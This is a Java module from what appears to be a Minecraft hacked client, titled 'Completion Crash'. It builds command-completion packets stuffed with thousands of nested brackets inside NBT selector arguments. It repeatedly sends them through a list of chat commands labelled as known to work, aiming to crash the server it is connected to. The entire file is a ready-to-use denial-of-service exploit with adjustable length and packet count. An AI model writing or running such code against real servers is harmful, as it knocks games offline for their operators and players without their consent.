package me.carrot0322.triplesense.features.modules.exploit;

import com.google.common.eventbus.Subscribe;
import me.carrot0322.triplesense.event.impl.GameLeftEvent;
import me.carrot0322.triplesense.features.modules.Module;
import me.carrot0322.triplesense.features.settings.Setting;
import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;

public class CompletionCrash extends Module {
    private final Setting<Integer> packets = register(new Setting<>("Packets", 3, 1, 5, "How many packets to send to the server."));
    private final Setting<Integer> length = register(new Setting<>("Length", 2005, 500, 32500, "Command Length"));
    private final Setting<Boolean> autoDisable = register(new Setting<>("Auto Disable", true, "Disables module on kick."));
    private final Setting<String> message = new Setting<>("message", "msg @a[nbt={PAYLOAD}]", "message");

    public CompletionCrash() {
        super("Completion Crash", "command completion crash", Category.EXPLOIT, true, false, false);
    }

    private int messageIndex = 0;

    private static final String nbtExecutor = " @a[nbt={PAYLOAD}]";
    private static final String[] knownWorkingMessages = {
            "msg",
            "minecraft:msg",
            "tell",
            "minecraft:tell",
            "tm",
            "teammsg",
            "minecraft:teammsg",
            "minecraft:w",
            "minecraft:me"
    };

    @Override
    public void onEnable(){
        messageIndex = 0;
        String overflow = generateJsonObject(length.getValue());
        String partialCommand = message.getValue().replace("{PAYLOAD}", overflow);
        for(int i = 0; i < packets.getValue(); i++) {
            mc.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, partialCommand));
        }
    }

    @Override
    public void onUpdate() {
        if(messageIndex == knownWorkingMessages.length - 1) {
            if(isEnabled()) disable();
            messageIndex = 0;
            return;
        }
        String knownMessage = knownWorkingMessages[messageIndex] + nbtExecutor;
        int len = 2044 - knownMessage.length();
        String overflow = generateJsonObject(len);
        String partialCommand = knownMessage.replace("{PAYLOAD}", overflow);
        for(int i = 0; i < packets.getValue(); i++) {
            mc.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, partialCommand));
        }
        messageIndex++;
    }

    @Subscribe
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.getValue()) toggle();
    }

    private String generateJsonObject(int levels) {
        StringBuilder builder = new StringBuilder("{a:");
        for (int i = 0; i < levels; i++) {
            builder.append("[");
        }
        builder.append("}");
        return builder.toString();
    }
}